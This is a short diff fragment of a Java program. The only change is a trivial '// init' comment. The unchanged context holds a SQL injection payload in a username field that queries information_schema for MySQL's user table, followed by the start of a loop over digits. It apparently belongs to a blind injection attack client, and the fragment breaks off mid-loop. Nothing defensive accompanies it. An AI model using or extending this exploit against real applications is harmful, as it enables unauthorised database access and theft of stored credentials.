@@ -11,6 +11,7 @@ import java.net.URL;
 import java.nio.charset.StandardCharsets;
 
 public class Main {
+    //  init
     public static void main(String[] args) {
         String username = "' UNION SELECT table_name from information_schema.columns where table_schema = 'mysql' and table_name = 'user' and column_name like 'use%';--";
         for(char ch = '0'; ch <= '9'; ++ch) {
